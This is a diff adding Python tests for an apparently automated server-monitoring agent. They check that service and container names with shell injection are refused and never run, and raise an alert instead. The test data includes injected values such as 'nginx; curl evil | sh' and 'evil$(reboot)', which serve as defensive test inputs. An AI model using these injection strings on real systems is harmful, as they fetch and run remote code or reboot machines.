@@ -117,3 +117,41 @@ async def test_refusal_skips_cooldown_consumption(agent):
     """Refused ad cooldown YEMEZ — düzeltilen config sonraki turda hemen denenir."""
     await agent._remediate_service("bad name", _alert())
     assert "service:bad name" not in agent._cooldowns
+
+
+# ── probe yolu (_check_services) — Codex P1: doğrulama remediate'te tek başına
+# yetmez, probe da aynı değeri f-string ile tam-shell'e gömer ──
+
+
+async def test_invalid_service_name_never_probed(agent):
+    """KRİTİK: enjeksiyonlu watchlist-adı probe shell'ine HİÇ ulaşmaz,
+    ama sessiz değil — alarm + refused-remediation akar."""
+    agent._critical_services = ["nginx; curl evil | sh"]
+    agent._critical_containers = []
+    await agent._check_services()
+    agent._executor.execute.assert_not_called()
+    source = "service:nginx; curl evil | sh"
+    assert source in agent._active_alerts
+    assert "gecersiz" in agent._active_alerts[source].message
+    assert len(agent._remediation_log) == 1
+    assert "refused" in agent._remediation_log[0].result
+
+
+async def test_invalid_container_name_never_probed(agent):
+    agent._critical_services = []
+    agent._critical_containers = ["evil$(reboot)"]
+    await agent._check_services()
+    agent._executor.execute.assert_not_called()
+    assert "docker:evil$(reboot)" in agent._active_alerts
+
+
+async def test_valid_names_probe_commands_unchanged(agent):
+    """Güvenli adda shlex.quote no-op — probe komutları bire-bir eski hali
+    (ShellExecutor whitelist regresyonu yok)."""
+    agent._critical_services = ["linux-ai-server"]
+    agent._critical_containers = ["n8n"]
+    agent._executor.execute = AsyncMock(return_value={"stdout": "active", "exit_code": 0})
+    await agent._check_services()
+    cmds = [c.args[0] for c in agent._executor.execute.await_args_list]
+    assert "systemctl is-active linux-ai-server" in cmds
+    assert any(c.startswith("docker ps --filter name=n8n ") for c in cmds)
